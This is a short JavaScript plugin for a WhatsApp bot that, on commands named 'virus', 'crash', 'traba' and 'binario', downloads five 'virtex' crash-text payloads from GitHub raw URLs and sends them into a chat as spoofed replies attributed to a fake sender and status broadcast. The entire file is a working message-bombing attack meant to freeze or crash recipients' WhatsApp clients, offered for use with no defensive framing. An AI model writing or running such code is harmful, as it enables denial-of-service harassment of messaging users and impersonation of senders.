import fetch from 'node-fetch'
let handler = async (m, { conn, text, args }) => {
let virtex = await fetch('https://raw.githubusercontent.com/Caliph91/txt/main/pirtex/1.txt').then(v => v.text());
let virtex2 = await fetch('https://raw.githubusercontent.com/Caliph91/txt/main/pirtex/2.txt').then(v => v.text());
let virtex3 = await fetch('https://raw.githubusercontent.com/Caliph91/txt/main/pirtex/3.txt').then(v => v.text());
let virtex4 = await fetch('https://raw.githubusercontent.com/Caliph91/txt/main/pirtex/4.txt').then(v => v.text());
let virtex5 = await fetch('https://raw.githubusercontent.com/BrunoSobrino/ShadowBotV3-OBSOLETO/master/lib/Binario.txt').then(v => v.text());
conn.sendPresenceUpdate('recording', m.chat)
conn.fakeReply(m.chat, virtex, '0@s.whatsapp.net', '🔥 *by MysticBot* 🔥', 'status@broadcast')
conn.fakeReply(m.chat, virtex2, '0@s.whatsapp.net', '🔥 *by MysticBot* 🔥', 'status@broadcast')
conn.sendPresenceUpdate('recording', m.chat)
conn.fakeReply(m.chat, virtex3, '0@s.whatsapp.net', '🔥 *by MysticBot* 🔥', 'status@broadcast')
conn.fakeReply(m.chat, virtex4, '0@s.whatsapp.net', '🔥 *by MysticBot* 🔥', 'status@broadcast')
conn.fakeReply(m.chat, virtex5, '0@s.whatsapp.net', '🔥 *by MysticBot* 🔥', 'status@broadcast')
conn.sendPresenceUpdate('recording', m.chat)}
handler.command = ['virus1', 'c1', 'binario1', 'traba1', 'crash1', 'virus', 'binario', 'traba', 'crash'] 
handler.rowner = true
export default handler
